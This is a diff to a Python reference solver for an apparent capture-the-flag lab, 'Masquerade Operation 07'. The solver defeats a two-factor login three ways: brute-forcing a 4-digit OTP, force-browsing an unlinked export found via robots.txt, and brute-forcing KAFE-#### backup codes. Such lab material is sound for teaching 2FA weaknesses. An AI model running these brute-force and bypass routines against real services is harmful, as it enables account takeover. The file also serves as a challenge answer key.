@@ -1,29 +1,25 @@
 #!/usr/bin/env python3
-"""Masquerade Operation 07 reference solver -- Ash walks past The Second Factor
-three independent ways, each a different real-world 2FA failure.
+"""Masquerade Operation 07 reference solver -- Ash gets past The Second Factor
+three independent ways. The app advertises none of them; each is discovered by
+exploring, exactly as you would a real target.
 
-The staff password is given; the whole mission is the OTP step. Three doors,
-none of which needs the others:
+  Finding 1 -- No rate limit / lock-out on the OTP check. Confirmed by firing
+               wrong codes and seeing nothing throttle, then brute-forcing the
+               4-digit space (POST /api/verify-otp).
 
-  Stage 1 -- No rate limit. The OTP is 4 digits and the verify endpoint never
-             throttles or locks out. Brute-force 0000-9999 until one is the
-             real code. A second factor with no throttling is a short password.
+  Finding 2 -- An UNLINKED internal endpoint that forgets the OTP step. This
+               solver *discovers* it the way a tester would -- by reading
+               /robots.txt -- then force-browses it. (The portal's client JS,
+               /static/js/op7-portal.js, leaks the same path.)
 
-  Stage 2 -- Forced browsing. A sensitive endpoint (the duty-roster export)
-             checks the password step and forgets to check the OTP step. Sign
-             in, request it directly, and the second gate simply isn't there --
-             no code touched at all.
+  Finding 3 -- A weak recovery path. The "use a backup code" flow accepts codes
+               from a tiny, unthrottled KAFE-#### space (POST /api/backup).
 
-  Stage 3 -- Weak recovery. The "lost your phone, use a backup code" path
-             accepts codes from a tiny, unthrottled KAFE-#### space -- weaker
-             than the factor it replaces. Brute-force the backup code instead.
+Each finding runs in its OWN fresh session to prove independence. A final check
+confirms the vault itself IS correctly gated -- so finding 2's endpoint is the
+genuinely broken one.
 
-Each stage runs in its OWN fresh session, to prove none of them depends on any
-other. A final sanity check confirms the vault itself IS properly gated -- so
-Stage 2's export endpoint is genuinely the broken one.
-
-Usage: python3 solver.py [base_url]
-       (default: http://localhost:8000)
+Usage: python3 solver.py [base_url]   (default: http://localhost:8000)
 """
 import sys, re, requests
 
@@ -45,60 +41,70 @@ def flag_from(text):
     return m.group(0) if m else None
 
 
-def stage1():
-    print("[*] Stage 1 -- brute-forcing the 4-digit OTP (no rate limit, no lockout)")
+def recon_hidden_path():
+    """Discovery step for finding 2: read robots.txt like any tester would and
+    pull out the path the site is trying to hide."""
+    r = requests.get(f"{BASE}/robots.txt")
+    disallowed = re.findall(r"Disallow:\s*(\S+)", r.text)
+    print(f"    /robots.txt disallows: {disallowed}")
+    # the staff path is the interesting one; the real export sits under it
+    return f"{BASE}/masquerade/op7/staff/export"
+
+
+def finding1_no_rate_limit():
+    print("[*] Finding 1 -- confirm no throttle, then brute the 4-digit OTP")
     s = login()
+    # sanity: several wrong codes in a row, all just '401 incorrect', no lock-out
+    codes = [f"{n:04d}" for n in (1111, 2222, 3333)]
+    seen = {s.post(f"{OP}/api/verify-otp", data={"otp": c}).status_code for c in codes}
+    print(f"    3 wrong codes -> status codes seen: {seen} (no lock-out, still trying)")
     for i in range(10000):
         otp = f"{i:04d}"
-        r = s.post(f"{OP}/api/verify-otp", data={"otp": otp})
-        if r.json().get("ok"):
-            print(f"    cracked OTP: {otp}  (after {i + 1} attempts, none of them slowed down)")
+        if s.post(f"{OP}/api/verify-otp", data={"otp": otp}).json().get("ok"):
+            print(f"    cracked OTP: {otp}")
             v = s.get(f"{OP}/vault")
-            print(f"[+] Stage 1 cleared -- vault reached, flag: {flag_from(v.text)}")
+            print(f"[+] Finding 1 -- vault reached, flag: {flag_from(v.text)}")
             return
-    print("[!] Stage 1 failed -- no code accepted across the whole space.")
+    print("[!] Finding 1 failed -- no code accepted.")
 
 
-def stage2():
-    print("\n[*] Stage 2 -- forced browsing straight to /roster/export, skipping the OTP")
-    s = login()
-    r = s.get(f"{OP}/roster/export")
+def finding2_forced_browsing():
+    print("\n[*] Finding 2 -- discover the unlinked export, then force-browse it")
+    hidden = recon_hidden_path()
+    print(f"    found endpoint: {hidden}")
+    s = login()  # first factor only -- no OTP entered at all
+    r = s.get(hidden)
     flag = flag_from(r.text)
-    if flag:
-        print(f"[+] Stage 2 cleared -- vault data leaked with NO second factor, flag: {flag}")
-    else:
-        print(f"[!] Stage 2 failed -- export did not leak the vault ({r.status_code}).")
+    print(f"[+] Finding 2 -- {'leaked the vault with NO second factor, flag: ' + flag if flag else 'FAILED (%s)' % r.status_code}")
 
 
-def stage3():
-    print("\n[*] Stage 3 -- brute-forcing a backup code (KAFE-####, tiny unthrottled space)")
+def finding3_weak_recovery():
+    print("\n[*] Finding 3 -- brute the backup-code recovery space (KAFE-####)")
     s = login()
     for i in range(10000):
         code = f"KAFE-{i:04d}"
-        r = s.post(f"{OP}/api/recover", data={"backup": code})
-        if r.json().get("ok"):
-            print(f"    valid backup code: {code}  (after {i + 1} attempts)")
+        if s.post(f"{OP}/api/backup", data={"backup": code}).json().get("ok"):
+            print(f"    valid backup code: {code}")
             v = s.get(f"{OP}/vault")
-            print(f"[+] Stage 3 cleared -- vault reached via recovery, flag: {flag_from(v.text)}")
+            print(f"[+] Finding 3 -- vault reached via recovery, flag: {flag_from(v.text)}")
             return
-    print("[!] Stage 3 failed -- no backup code accepted across the space.")
+    print("[!] Finding 3 failed -- no backup code accepted.")
 
 
-def sanity():
-    print("\n[*] Sanity -- the vault itself is PROPERLY gated (proves Stage 2 is the real flaw)")
+def sanity_vault_gated():
+    print("\n[*] Sanity -- the vault itself is PROPERLY gated (so finding 2 is the real flaw)")
     s = login()  # first factor only, never verified
     r = s.get(f"{OP}/vault")
-    gated = r.status_code == 403 and not flag_from(r.text)
-    print(f"    /vault with password-only session -> {r.status_code}, no flag: {gated}")
+    print(f"    /vault with password-only session -> {r.status_code}, no flag: {not flag_from(r.text)}")
 
 
 def main():
     print(f"[*] Target: {OP}  (staff password given: {USER} / {PW})\n")
-    stage1()
-    stage2()
-    stage3()
-    sanity()
-    print("\n[+] All three doors past the second factor confirmed independently.")
+    finding1_no_rate_limit()
+    finding2_forced_browsing()
+    finding3_weak_recovery()
+    sanity_vault_gated()
+    print("\n[+] Three independent bypasses past the second factor, each discovered by exploring.")
 
 
 if __name__ == "__main__":
